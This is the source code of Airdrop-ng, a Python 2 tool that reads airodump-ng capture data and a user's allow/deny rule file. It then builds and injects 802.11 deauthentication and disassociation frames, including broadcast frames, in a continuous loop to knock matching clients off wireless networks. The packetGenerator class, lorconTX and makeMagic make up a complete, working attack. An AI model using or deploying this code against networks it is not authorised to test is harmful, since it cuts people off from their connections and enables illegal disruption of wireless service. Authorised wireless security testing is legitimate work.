#!/usr/bin/env python
#part of project lemonwedge
__author__	= "TheX1le & King_Tuna"
__version__ = "2010.2.26.2.00.00"
__licence__ = "GPL2"
"""
Airdrop-ng A rule based wireless deauth tool
a compoent of project lemonwedge
Written by Thex1le and King_Tuna
"""
import sys, optparse, re, time, random, pdb, os

#update the path with sub directories
#lib for the libraries and support for the oui.txt file

# adds possible paths for support modules
sys.path.extend(["./lib","/usr/lib/airdrop-ng"])
import libDumpParse
from time import sleep,localtime
from colorize import bcolors
import libOuiParse
from binascii import a2b_hex
class messages:
	"""
	handle all printing 
	allows for central logging
	"""
	def __init__(self,log,dir="./logs"):
		"""
		int vars for printing class
		"""
		date 		 = localtime()
		self.date 	 = str(date[0])+str(date[1])+str(date[2])
		self.time	 = str(date[3])+"-"+str(date[4])+"-"+str(date[5])
		self.logging = log #log error messages to a file
		#logfile
		self.logfile = dir+'/Airdrop-'+self.date+"-"+self.time+".log"
		self.color 	 = True #enable colors
		self.logBuff = [] #hold info before we write to a file
		
		if self.logging == True:
			try:
				file = open(self.logfile,'a')
				file.write(self.date+"-"+self.time+"\n")
				file.write("Airdrop-ng Logfile\n")
				file.close
			except IOError,e:
				self.logging = False
				self.printError(["Could not open file "+self.logfile+"\n\n",
					str(e)+"\n"])

	def printMessage(self,message):
		"""
		print standard info messages
		"""
		TYPE = type(message).__name__
		if TYPE == 'list':
			for line in message:
				print line
		elif TYPE == 'str':
			print message
		self.log(message,TYPE)
		
	def printError(self,error):
		"""
		write errors to stderr in red
		"""
		TYPE = type(error).__name__
		if TYPE == 'list':
			for line in error:
				sys.stderr.write(bcolors.FAIL+line+"\n"+bcolors.ENDC)
		elif TYPE == 'str':
			sys.stderr.write(bcolors.FAIL+error+"\n"+bcolors.ENDC)
		self.log(error,TYPE)

	def log(self,data,TYPE):
		"""
		write all messages to a file
		"""
		if self.logging is False:
			return
		try:
			file = open(self.logfile,'a')
		except IOError,e:
			self.logging = False
			self.printError(["Could not open file "+self.logfile+"\n",
				str(e)+"\n"])
			sys.exit(-1)
		if TYPE == 'list':
			for item in data:
				file.write(str(item)+"\n") #str allows me to print out data structures
		elif TYPE == 'str':
			file.write(data)
		file.close

class parseFiles:
	"""
	parse users acl rules into a dict for matching
	"""
	def fileOpen(self,name):
		"""
		Open the file and read in the rules and remove \\n characters
		"""
		try:
			openFile = open(name,"r")
		except IOError,e:
			message.printError("\nAirdrop-ng rule file",name,"does not exist")
			sys.exit(-1)
		rules = openFile.xreadlines()
		cleanedRules = []
		for line in rules:
			cleanedRules.append(line.rstrip())
		openFile.close()
		return cleanedRules
		
	def translateOUI(self,ouiLst,flag):
		"""
		take an oui and find all matching mac addresses
		in the sniffed data
		"""
		clientLst =[] #empty client list to hold are found clients
		#check if were doing client oui beck or bssid oui check
		if flag == 'c':
			db = self.airoClient.keys()
		elif flag == 'b':
			db = self.airoAP.keys()
		
		for key in db:
			if key[:8] in ouiLst:
				clientLst.append(key)
		return clientLst
				
	def ruleParse(self,ruleRaw):
		"""
		parse the actual rules and return a dictionary
		"""
		clientList	  = []
		pipe		  = ruleRaw.find('|')
		compTrue	  = ruleRaw[1:].find(',') 
		clientOuiList = [] #list to store client ouis
		bssidOuiList  = [] #list to store bssid ouis
		bssid		  = None #place holder
		bssidList	  = []
		essidList	  = {}
		for ap in self.airoAP.values():
			essidList[ap["essid"]] = ap["bssid"]
		
		if compTrue == -1: delim = ';'
		else: delim = ','
		for postion in ruleRaw[pipe+1:].split(delim):
			if postion.upper() == "ANY": #client any
				break
			else:
				cmac = postion.upper().replace("-",":")	
				if self.validMacChk(cmac) == True: 
					#build a list of clients
					clientList.append(cmac)
				elif ouiLookup.compKeyChk(postion) == True: #company oui lookup
					#check to see if its an company name we can lookup
					clientOuiList.extend(ouiLookup.lookup_company(postion))
				elif ouiLookup.ouiKeyChk(postion) == True: #oui match
					#check to see if its an oui we can lookup
					clientOuiList = [postion] 
				else:
					message.printMessage([
						"\nInvalid mac or company name",
						"at "+postion+" in "+ruleRaw," Moving on to next rule"])
					return False

		#translate ouis then append them to client list
		if clientOuiList != []:
			clientList.extend(
				self.translateOUI(clientOuiList,'c')
					)
			clientOuiList = [] #empty the var			
		#begin bssid parse
		if ruleRaw[2:pipe].upper() != "ANY":
			bssidMac = ruleRaw[2:pipe].replace("-",":") 
			valid = self.validMacChk(bssidMac)
			if valid == True :
				#match mac address
				bssidList = [bssidMac.upper()]
			
			elif bssidMac in essidList.keys():
				for essid in essidList.keys():
					if bssidMac == essid:
						bssidList.append(essidList[essid])
			
			elif ouiLookup.compKeyChk(bssidMac) == True: #company oui lookup
				bssidOuiList.extend(ouiLookup.lookup_company(bssidMac))
				if bssidOuiList != []:
					bssidList.extend(
						self.translateOUI(bssidOuiList,'b')
						)
					bssidOuiList = [] #empty var
			elif ouiLookup.ouiKeyChk(bssidMac) == True: #oui match
				#check to see if its an oui we can lookup
					bssidOuiList = [bssidMac]
					bssidList = self.translateOUI(bssidOuiList,'b')
					bssidOuiList = [] #empty var
			else:
				message.printMessage([
					"\nInvalid mac or company name",
					"at "+postion+" in "+ruleRaw," Moving on to next rule"])
				return False
		else:
			bssidList = ["ANY"]

		if bssidList == []:
			message.printMessage(["\nInvalid mac in bssid section of "+ruleRaw,
			"Or no matching ouis found in sniffed data",
			"Moving on to next rule"])
			return False 
		state = ruleRaw[0].lower()
		if len(bssidList) <= 1: 
			#if we only have one bssid we dont want to nest the dict in a list
				for bssid in bssidList:
					
					if clientList == [] and postion.upper() != 'ANY':
						ruleDict = {
							"state":state,
							"bssid":bssid,
							"clients":[postion],
							"raw":ruleRaw}
					
					if clientList == [] and postion.upper() == 'ANY':
						ruleDict = {
							"state":state,
							"bssid":bssid,
							"clients":"ANY",
							"raw":ruleRaw}
					else:
						ruleDict = {
							"state":state,
							"bssid":bssid,
							"clients":clientList,
							"raw":ruleRaw}
		elif len(bssidList) > 1:
				#if more then one bssid nest each rule dict in a list
				ruleDict = []
				for bssid in bssidList:
					if clientList == [] and postion.upper() != 'ANY':
						ruleDict.append({
							"state":state,
							"bssid":bssid,
							"clients":[postion],
							"raw":ruleRaw
							})
					elif clientList == [] and postion.upper() == 'ANY':
						ruleDict.append({
							"state":state,
							"bssid":bssid,
							"clients":"ANY",
							"raw":ruleRaw
							})
					else:
						ruleDict.append({
							"state":state,
							"bssid":bssid,
							"clients":clientList,
							"raw":ruleRaw
							})
		return ruleDict
	
	def validChk(self,rule):
		"""
		find commented lines
		"""
		ruleStrip = rule.strip('\t').lstrip()
		if ruleStrip == "":
			return False
		elif ruleStrip[0] == "#":
			return False
		else:
			return True
	
	def commentOff(self,rules):
		"""
		This is a horrible hack but the idea is to remove the commented lines
		"""
		validRules = []
		while len(rules) != 0:
			chkme = rules.pop()
			if self.validChk(chkme) == True:
				validRules.append(chkme.strip('\t').lstrip())
		return validRules
	
	def run(self,fileName,AiroDBs):
		"""
		populate ruleList
		"""
		#are the airoDB's used by translate ouis
		self.airoClient = AiroDBs[0]#airodump client db
		self.airoAP		= AiroDBs[1]#airodump ap DB
		fileRules 		= self.fileOpen(fileName)
		rawRules  		= self.commentOff(fileRules)
		ruleList  		= {}
		ruleCounter = 0
		rawRules.reverse() #reverse the rules as they get loaded in backwards
		for rule in rawRules: #populate ruleList 
			prule = self.ruleParse(rule)
			ruleCounter += 1
			if prule != False:
					ruleList[ruleCounter] = prule
			else:
				continue
		return ruleList
	
	def validMacChk(self,mac):
		"""
		Check for valid mac address
		If Invalid exit and print invalid mac and error msg to user
		"""
		#regex will match format of DE:AD:BE:EF:00:00 or DE-AD-BE-EF-00-00
		check = '([a-fA-F0-9]{2}[:|\-]?){6}'
		if re.match(check, mac): 
			return True 
		else: 
			return False

class ruleMatch:
	"""
	In the process of being depreciated
	Do Rule matching
	#NOTE in the future leave capr static and dont delete from it
	"""
	
	def __init__(self,rulesDB,capr,ClientApDB,debug):
		"""
		create vars for rule matching
		"""
		self.violators 	= {} 			#dict with bssid as a key and list 
					  					#of clients as nested list these cleints are our targets
		self.rulesDB 	= rulesDB		#rules database
		self.capr		= capr			#client to ap relationship
		self.ClientApDB = ClientApDB	#Access point dict contain all info about each Ap
		self.debug		= debug			#debug flag
		self.violators	= {}			#dict with bssid as a key and list of clients 
		self.bssid 		= None			#bssid of the rule we are looking at
		self.state		= None			#state of the rule either allow or deny
		self.clients	= []			#client list that are affected by the rules
		self.rule		= None			#entire rule so we can print for debug mode
		self.Client		= None			#the client we are currently working with
		self.fullRule	= None			#the entire dict for printing in error messages
		self.num		= None			#number of rule we are matching
		
	def locate_key(self):
		"""
		take a client and locate its coresponding bssid
		iterate though capr and find unknown bssid a client is 
		associated with
		"""
		for bssidKey in self.capr:
			if self.Client in self.capr[bssidKey]:
				client_bssid = bssidKey
				#break at first match
				break
			else:
				#return none in client cant
				#be found in capr
				client_bssid = None
		return client_bssid
	
	def oui2mac(self,oui):
		"""
		#no longer used
		Take an oui find all clients that match 
		and place them in a list
		"""
		OUItoMac = []
		for mac in self.ClientApDB[0]: #keys are client macs
			if oui == mac[:8]:
				#if first 3 match match the oui 
				#add them to the client list
				OUItoMac.append(mac)
		
		if OUItoMac != []:
			return OUItoMac
		else:
			#return none if the oui's dont match sniffed data
			return None
	
	def rm_dupe(self,List):
		"""
		Remove duplicates from list
		"""
		dict = {}
		for item in List:
			dict[item]=item
		return dict.values()
	
	def ruleQue(self):
		"""
		set global class values one at a time
		then call matcher
		"""
		for num in sorted(self.rulesDB.keys()):
			#make sure the rules are called in order
			#it stops iterating at one less then we need so add +1
			if type(self.rulesDB[num]).__name__ == "list":
				for rule in self.rulesDB[num]:
					self.bssid	  = rule["bssid"]
					self.state	  = rule["state"]
					self.clients  = rule["clients"]
					self.rule	  = rule["raw"]
					self.fullRule = str(rule)
					self.num	  = str(num)
					self.match() #call matching
			else:
				self.bssid	  = self.rulesDB[num]["bssid"]
				self.state	  = self.rulesDB[num]["state"]
				self.clients  = self.rulesDB[num]["clients"]
				self.rule	  = self.rulesDB[num]["raw"]
				self.fullRule = str(self.rulesDB[num])
				self.num 	  = str(num)
				self.match() #call matching
		
		return self.violators #return kicklist

	def match(self):
		"""
		Main list of rule conditions to check
		"""
		if self.bssid != "ANY":
			if self.ClientApDB[1].has_key(self.bssid):
				self.channel = self.ClientApDB[1][self.bssid]["channel"]
				#if this var doesnt get set it casues an error
			else:
				message.printMessage([
					"\nInvaid bssid "+self.bssid+" not found in sniffed data",
					"Rule number "+self.num,self.rule, 
					"Moving to next rule\n"])
				return
		#start rule matching
		if self.capr.has_key(self.bssid) or self.bssid == 'ANY':  
			#check to make sure we have target bssid in capr
			#start allow rule matching
			if self.state == "a":
				if self.bssid != "ANY" and self.clients != "ANY": 
					#allow client to bssid rule matching
						#if no any's delete clients we want to allow from capr 
						#the rest are valid targets
					for client in self.clients:
						#update current working client
						self.Client = client 
						try: 
							#atempt to remove client from capr dict
							position = self.capr[self.bssid].index(self.Client)
							del self.capr[self.bssid][position]
						except ValueError:
							pass
					if self.violators.has_key(self.bssid):
						#set allow bcast to False
						self.violators[self.bssid][0]["allow"] = False
						#set channel incase it has changed
						self.violators[self.bssid][0]["channel"] = self.channel 
					else:
						self.violators[self.bssid] = [
								{"allow":False,"channel":self.channel}, #support data
								[] #empty client list
								]

						if self.debug == True: #debug flag
							message.printMessage(["Rule Number "+self.num,
							self.rule, self.fullRule,
							"Allow "+str(self.clients)+" client to "+self.bssid+" bssid\n"])

				
				elif self.bssid != "ANY" and self.clients == "ANY": # 
					#allow bssid any client rule matching
					#remove the bssid and all clients from our target list
					del self.capr[self.bssid] 
					#remove the clients and the bssid from the target list 
					#potential bug
					if self.debug == True:
						message.printMessage(["Rule Number "+self.num,
							self.rule, self.fullRule,
							"\nAll clients allowed to talk to "+self.bssid+" bssid",
							"No packets will be sent"])
				
				elif self.bssid == "ANY" and self.clients == "ANY":
					#allow any any rule matching
					if self.debug == True:
						message.printMessage(["Rule Number "+self.num,
							self.rule,self.fullRule,
							"All clients are allowed to all Aps No packets will be sent\n"])
					
					message.printMessage(["\nReached "+self.rule+" "+self.fullRule,
					"Rule Number "+self.num,
					"Rule is allow any any no Packets will be sent"])
					sys.exit(0)
				
				elif self.bssid == "ANY" and self.clients != "ANY":
					#allow some clients to talk to any AP
					for client in self.clients:
						self.Client = client
						self.bssid = self.locate_key()
						#set channel 
						self.channel = self.ClientApDB[1][self.bssid]["channel"]
						#look up each client and update self.bssid
						if self.bssid == None:
							message.printMessage([
								"\nClient "+self.Client+" not found in sniffed data,",
								"Client will be ignored"])
							#continue #skip this client and move on to the next in the for loop
							return
						try:
							#locate the clients postion in capr
							position = self.capr[self.bssid].index(self.Client)
							del self.capr[self.bssid][position] #remove it from capr
						except ValueError:
							pass
						
						if self.violators.has_key(self.bssid):
							self.violators[self.bssid][0]["allow"] = False
							self.violators[self.bssid][0]["channel"] = self.channel
						else:
							self.violators[self.bssid] = [
									{"allow":False,"channel":self.channel}, #support data
									[] #empty client list
									]
						
						if self.debug == True:
							message.printMessage(["Rule Number "+self.num,
							self.rule,self.fullRule,
							"Allow "+self.Client+" client to "+self.bssid+" bssid\n"])
				else: 
					message.printError(["ERROR in config file at:",
						"Rule Numer "+self.num,
						self.rule,self.rulesDB,
						"Could not match "+self.bssid+" or "+self.clients,
						"Please check the rule and try again"])
					sys.exit(-1)
			
			#deny rule matching
			elif self.state == "d":
				if self.bssid == "ANY" and self.clients == "ANY": #global deauth
					#any any match rule
					message.printMessage(["\nReached global deauth at rule "+self.rule,
						"Rule Number "+self.num,
						"All clients that dont have a rule will be kicked at this point"])
					for key in self.capr: #looping though to allow channel lookup
						self.bssid = key
						self.channel = self.ClientApDB[1][self.bssid]["channel"]
						if self.violators.has_key(self.bssid):
							#we assume at this point that the bcast allow has been set
							self.violators[self.bssid][1].extend(
									self.capr[self.bssid] #add all clients
									)
							#update channel incase it changed
							self.violators[self.bssid][0]["channel"] = self.channel
						else:
							self.violators[self.bssid] = [
									{"allow":True,"channel":self.channel}, #support data
									self.capr[self.bssid] #list of clients to kick 
									]
					
						if self.debug == True:
							message.printMessage(["Rule Number "+self.num,
							self.rule,self.fullRule,
							"Deny "+str(self.capr[self.bssid])+" client to "+self.bssid+" bssid\n"])
					#may change to a break since its an any any
					#continue #move on to the next rule in the list later ill prob break the iteration? 
				
				elif self.bssid == "ANY" and self.clients != 'ANY':
					#deny any AP and select clients
					for client in self.clients:
						self.Client = client
						self.bssid  = self.locate_key()
						if self.bssid == None:
							message.printMessage(["Unable to locate bssid for "+client,
								" Skipping\n"])
							continue
						#set channel
						self.channel = self.ClientApDB[1][self.bssid]["channel"]
						if self.bssid  == None:
							message.printMessage(["Client "+self.Client+" not found in sniffed data",
								"client will be ignored"])
							#continue #skip this client and move on to the next in the for loop
							continue 

						if  self.capr.has_key(self.bssid): #checking for valid targets
							if self.violators.has_key(self.bssid):
								#extend the list of targets
								self.violators[self.bssid][1].append(self.Client)
								self.violators[self.bssid][0]["channel"] = self.channel
							else:
								self.violators[self.bssid] = [
									{"allow":False,"channel":self.channel},
									[self.Client]
									]
						
						if self.debug == True:
							message.printMessage(["Rule Number "+self.num,
								self.rule,self.fullRule,
								"Deny "+self.Client+" client to "+self.bssid+" bssid\n"])
				
				elif self.bssid != "ANY" and self.clients == "ANY":
					#deny client any rule matching
					if self.violators.has_key(self.bssid):
						self.violators[self.bssid][1].extend(self.capr[self.bssid])
						#remove any duplicate entries
						self.violators[self.bssid][1] = self.rm_dupe(self.violators[self.bssid][1])
						self.violators[self.bssid][0]["channel"] = self.channel
					else:
						self.violators[self.bssid] = [
								{"allow":True,"channel":self.channel},
								self.capr[self.bssid]
								]
							
					if self.debug == True:
						for client in self.violators[self.bssid][1]:
							message.printMessage(["Rule Number "+self.num,
								self.rule,self.fullRule,
								"Deny "+client+" clients to "+self.bssid+" bssid\n"])
				
				elif self.bssid != "ANY" and self.clients != "ANY":
					#deny between client and AP no anys used
					for client in self.clients:
						#do the following checks for each client
						self.Client = client
						if self.Client not in self.capr[self.bssid]:
							#if current client doesnt belong to current ap
							#dont generate a packet for it
							if self.debug == True:
								message.printMessage(["Rule Number "+self.num,
									self.rule,self.fullRule,
									"Client "+self.Client+" not attached to "+self.bssid,
									"Moving on\n"])
							continue
						if self.violators.has_key(self.bssid):
							self.violators[self.bssid][1].append(self.Client)
						else:
							self.violators[self.bssid] =[
								{"allow":False,"channel":self.channel},
								[self.Client]]
						
						if self.debug == True:
							message.printMessage(["Rule Number "+self.num,
								self.rule,self.fullRule,
								"Deny "+self.Client+" client to "+self.bssid+" bssid\n"])
						#do final processing on all affected clients
						#remove duplicates
						self.violators[self.bssid][1] = self.rm_dupe(self.violators[self.bssid][1])
						#update channel on the card incase it changed
						self.violators[self.bssid][0]["channel"] = self.channel
			else:
				message.printMessage(["Config file error at line",
					self.rule,self.rulesDB[num],
					"State must be either an a for allow or d for deny"])
				sys.exit(-1)

		return self.violators

class packetGenerator:
	"""
	A collection of code for building packets
	"""
	def __init__(self,allow_bcast,destination_addr,source_addr,bss_id_addr,channel):
		"""
		intialize packet hex values
		"""
		self.packetTypes = {
				"deauth":'\xc0\x00', #deauthentication packet header
				"disass":'\xa0\x00'  #disassoication packet header
				}
		self.packetBcast = {
				"ipv4":'\xff\xff\xff\xff\xff\xff', #ipv4 broadcast
				"ipv6":'\x33\x33\x00\x00\x00\x16', #ipv6 broadcast
				"stp":'\x01\x80\xc2\x00\x00\x00'   #Spanning Tree broadcast
				} 
				#note this also contains some multi cast addresses
		self.packetReason = [
				'\x0a\x00', #Requested capability set is too broad 
				'\x01\x00', #unspecified 
				'\x05\x00', #disassociated due to insufficent resources at the ap
				'\x04\x00', #Inactivity timer expired
				'\x08\x00', #Station has left BSS or EBSS
				'\x02\x00'  #Prior auth is not valid
				] #reason codes
		#add more reason codes?
		self.allow_bcast = allow_bcast
		self.destination_addr = self.convertHex(destination_addr)
		self.source_addr = self.convertHex(source_addr)
		self.bss_id_addr = self.convertHex(bss_id_addr)
		self.channel = channel

	def buildPacket(self,type,dstAddr,srcAddr,bssid,reasonCode):
		"""
		Constructs the packets to be sent
		"""
		#packetParts positions are as follows 
		#0:type 1:destination_addr 2:source_addr 3:bss_id_addr 4:reason
		packet = [type] #subtype
		packet.append('\x00\x00') 	#flags
		packet.append(srcAddr) 		#destain_addr
		packet.append(dstAddr) 		#source_addr
		packet.append(bssid) 		#bss_id_addr
		packet.append('\x70\x6a') 	#seq number
		packet.append(reasonCode) 	#reason code
		return "".join(packet)

	def convertHex(self,mac):
		"""
		convert a mac address to hex
		"""
		return a2b_hex(mac.replace(":",""))
	
	def packetEngine(self):
		"""
		Build each packet based on options
		"""
		packets = []
		if self.allow_bcast == False:
			#broadcast packets will not be sent
			for type in self.packetTypes: # tx two packets with random reasons one two and one from
				packets.append([
					self.buildPacket(
						self.packetTypes[type], #packet type
						self.destination_addr, 	#destinaion
						self.source_addr, 		#source
						self.bss_id_addr, 		#bssid
						self.randReason() 		#resoncode
						),
					self.channel])
				packets.append([
					self.buildPacket(
						self.packetTypes[type], #packet type
						self.source_addr,		#destination
						self.destination_addr,  #source
						self.bss_id_addr,		#bssid
						self.randReason()		#reasoncode
						),
					self.channel])

		if self.allow_bcast == True:
			#broadcast packets will be sent
			for type in self.packetTypes: #tx two packets with random reasons one too bssid and one from bssid
				packets.append([
					self.buildPacket(
						self.packetTypes[type],
						self.destination_addr,
						self.source_addr,
						self.bss_id_addr,
						self.randReason()
						),
					self.channel])
				packets.append([
					self.buildPacket(
						self.packetTypes[type],
						self.source_addr,
						self.destination_addr,
						self.bss_id_addr,
						self.randReason()
						),
					self.channel])
				for bcast in self.packetBcast:#send bcast packets one two and one from
					packets.append([
						self.buildPacket(
							self.packetTypes[type], #packet type
							self.packetBcast[bcast],#destination
							self.source_addr,		#source
							self.bss_id_addr,		#bssid
							self.randReason()		#reasoncode
							),
						self.channel])
					packets.append([
						self.buildPacket(
							self.packetTypes[type], #packet type
							self.source_addr,		#destination
							self.packetBcast[bcast],#source
							self.bss_id_addr,		#bssid
							self.randReason()		#reasoncode
							),
						self.channel])
		return packets
	
	def randReason(self):
		"""
		Generate a random reason code for the kick
		"""
		return self.packetReason[
			random.randrange(
				0,len(self.packetReason),1
				)
			]
			
class getTargets():
	"""
	Call parser for the airodump csv file and rule files
	"""
	def __init__(self,rules,data,debug):
		"""
		Init with all vars for getTargets class
		"""
		self.FileParsers = parseFiles() #call all file parsing functions
		self.AirParser	 = libDumpParse.airDumpParse() #call the airodump parser	
		self.rules	 	 = rules		#file name of rules file
		self.Airo	 	 = data			#file name of airodump csv file
		self.debug	 	 = debug		#debug flag
		self.targets 	 = None			#var to store matched targets in
	
	def dataParse(self):
		"""
		parse the user provided files and 
		place their outputs into the rule matcher
		"""
		parsedAiro = self.AirParser.parser(self.Airo)
		parsedRules = self.FileParsers.run(self.rules,parsedAiro[1])
		rMatch = ruleMatch(parsedRules,parsedAiro[0],parsedAiro[1],self.debug)
		return rMatch.ruleQue()

	def run(self):
		"""
		reparse all data every 4 seconds
		"""
		self.targets = self.dataParse()

def lorconTX(pktNum=5,packet=None, channel=1 ,slept=0):
	"""
	Uses lorcon to send the actual packets
	"""
	#why the hell does pktNum default = 5?
	#pktNum is number each packet is sent
	count = 0
  	tx.setfunctionalmode("INJECT")
	if tx.getchannel() != channel:
		try:
			tx.setchannel(channel) #set the channel to send packets on
		except pylorcon.LorconError,e:
			message.printError(["\nError Message from lorcon:",str(e),
				"Unable to set channel card does not seem to support it",
				"Skipping packet"])
			return False
	while count != pktNum:
		try:
			tx.txpacket(packet)
		except pylorcon.LorconError,e:
			message.printMessage(['\nError Message from lorcon:',str(e),
			"Are you sure you are using the correct driver with the -d option?",
			"Or try ifconfig up on the card you provided and its vap."])
			sys.exit(-1)
		count += 1
	else:
        	if slept > 0:
               		sleep(slept)
	return

def makeMagic(targets,slept = 0):
	"""
	function where the targes are looped though 
	and packets are sent to them
	"""
	packetQue = []
	packetCount = 1 #hard coded number of how many copys of each packet is sent
	for bssid in targets:
		for client in targets[bssid][1]:
			engine = packetGenerator(
					targets[bssid][0]["allow"],
					client,bssid,bssid,
					targets[bssid][0]["channel"]
					)
			packetQue.extend(engine.packetEngine())
	numPackets = len(packetQue)
	message.printMessage(
		"\nAttempting to TX "+str(numPackets)+" packets "+str(packetCount)+" times each")
	while len(packetQue) != 0:
		lorconTX(
			packetCount, #number of packets to send
			packetQue[0][0], #packet in hex
			int(packetQue[0][1]) #channel to tx the packet on
			)
		sleep(slept)
		del packetQue[0] #remove the sent packet from the que
	message.printMessage(
		"\nSent "+str(numPackets)+" packets "+str(packetCount)+" times each")
	return numPackets * packetCount
			

def help():
	"""
	function for lemonwedge intigration
	supports its show help call
	"""
	print "<"+"~"*59+">\n"		
	print "Airdrop Module for rule based deauth"
	print "This module requires airodump-ng to run"
	print "Module options:\n"
	print "\t? These need to be set"

def firstLoad():
	"""
	provides var names need to run airdrop
	used for calling airdrop from PLW
	"""
	allfunctionlist = {
		"startAirdrop":{
				"iface":"", 				 	#injection interface
				"driver":"mac80211",			#driver of the card we inject with
				"adlog":os.getcwd()+"/log/airodump.log",#logfile to parse to decide on kick types
				"rules":os.getcwd()+"/support/",	#the drop rules
				"slept":"0"					#sleep time between each packet tx's
				}
			}
	
	return allfunctionlist

def startAirdop():
	"""
	function for calling airdrop
	from PLW
	"""
	pass

def usage():
	"""
    Prints the usage to use airgraph-ng
    """
	print "\n"+bcolors.OKBLUE+"#"*49
	print "#"+" "*13+bcolors.ENDC+"Welcome to AirDrop-ng"+bcolors.OKBLUE+" "*13+"#"
	print "#"*49+bcolors.ENDC+"\n"

def commandUsage():
	print "\nSample command line arguments:"
	print "\npython airdrop-ng.py -i mon0 -t airodump.csv -r rulefile.txt\n"	

def OUIupdate():
	"""
	update the ouilist
	"""
	#note to self why the hell am i calling another function hear?
	#must be marfi's code
	#   Marfi: Which was working....
	message.printMessage("Updating OUI list...")
	ouiUpdate()
	sys.exit(0)

if __name__ == "__main__":
	"""
	Main function.
	Parses command line input for proper switches and arguments. Error checking is done in here.
	Variables are defined and all calls are made from MAIN.
	"""
	usage()
	
	driverList = ['wlan-ng','hostap','airjack','prism54','madwifing','madwifiold',
		'rtl8180','rt2570','rt2500','rt73','rt61','zd1211rw','bcm43xx','mac80211']
	parser = optparse.OptionParser("usage: %prog options [-i,-t,-r] -d -s -p -b -n")  #
	parser.add_option("-i", "--interface",  dest="card",nargs=1, 
				help="Wireless card in monitor mode to inject from")
	parser.add_option("-t", "--dump", dest="data", nargs=1 ,
				help="Airodump txt file in CSV format NOT the pcap")
	parser.add_option("-p", "--nopsyco",dest="pysco",action="store_false",
				default=True,help="Disable the use of Psyco JIT")
	parser.add_option("-r", "--rule",dest="rule", nargs=1 ,help="Rule File for matched deauths")
	parser.add_option("-u", "--update",dest="OUIupdate", nargs=0, help="Updates OUI list")
	parser.add_option(
				"-d", 
				"--driver",
				dest="driver",
				default="mac80211",
				nargs=1,
				help="Injection driver. Default is mac80211, Possible options are "+str(driverList),
				)
	parser.add_option("-s", "--sleep",dest="slept",default=0,nargs=1,type="int",help="Time to sleep between sending each packet")
	parser.add_option("-b", "--debug",dest="debug",action="store_true",default=False,help="Turn on Rule Debugging")
	parser.add_option("-l", "--logging",dest="log",action="store_true",default=False,help="Enable Logging to a file, if file path not provided airdrop will log to default location")
	parser.add_option("-n", "--nap",dest="nap",default=0,nargs=1,help="Time to sleep between loops")

	if len(sys.argv) <= 1: #check and show help if no arugments are provided at runtime
				parser.print_help()
				commandUsage()
				sys.exit(0)
	(options, args) = parser.parse_args()
	#set the program loop value
	
	#************
	#HUDGE CHANGE
	#************
	
	#basicly all of this code needs to be moved to startAirdrop()
	
	#************
	#HUDGE CHANGE
	#************
	
	#commented old code for deletion
	#loop = True
	
	#start up printing
	if args == []:
		message = messages(options.log)
	else:
		message = messages(options.log,args[0])

	
	TotalPacket = 0 #total packets tx'd

	if os.geteuid() != 0:
		message.printError(["airdrop-ng must be run as root.\n", 
		"Please 'su' or 'sudo -i' and run again.\n","Exiting...\n\n"])
		sys.exit(-1)
	
	if options.OUIupdate != None:
		libOuiParse.macOUI_lookup(None)

	if None in [options.card,options.rule,options.data]:
		message.printMessage("You are missing either -i, -t or -r")
		sys.exit(-1)

	elif options.driver not in driverList:
		message.printError(["Invalid Driver\n","Please use a lorcon supported driver\n",
				"You provided "+options.driver+".\n","Possible options are"])
		message.printMessage(driver+"\n")
		sys.exit(-1)
	
	if options.pysco == True: 
		#if false we wont use psyco
		#usefull when using pdb
		try:
			import psyco
			psyco.full()
		except ImportError:
			message.printMessage(" Psyco Not found you may wish to install it to increase speed")
	try:
		try:
			import pylorcon
			try:
				tx = pylorcon.Lorcon(options.card,options.driver)
			except pylorcon.LorconError,e:
				message.printMessage(["\n",
					e,"Interface "+options.card+" does not exist"])
				sys.exit(-1)
		except ImportError:
			message.printMessage("\nPylorcon error, do you have it installed?")
			sys.exit(-1)
		try:
			#populate the oui lookup datatbases
			try:	
				try:
					ouiLookup = libOuiParse.macOUI_lookup("./support/oui.txt")
				except IOError:
					ouiLookup = libOuiParse.macOUI_lookup("/usr/lib/airdrop-ng/oui.txt")
			except IOError:
				message.printError(["oui.txt not found in /usr/lib/airdrop-ng","or ./support/"])
				message.printError("Please run python airdrop-ng -u")
				sys.exit(-1)

		except ImportError,e:
			message.printMessage(["\n",e,"ouiParser error"]) 
			sys.exit(-1)
		
		#Start the main loop
		Targeting = getTargets(options.rule,options.data,options.debug)
		while True:
				Targeting.run()	
				if Targeting.targets != None:
					TotalPacket += makeMagic(Targeting.targets,int(options.slept))
					message.printMessage("Waiting "+str(options.nap)+" sec in between loops\n")
					sleep(float(options.nap))

	except (KeyboardInterrupt, SystemExit):
		message.printMessage(["\nAirdrop-ng will now exit","Sent "+str(TotalPacket)+" Packets",
			"\nExiting Program, Please take your card "+options.card+" out of monitor mode"])
		sys.exit(0)
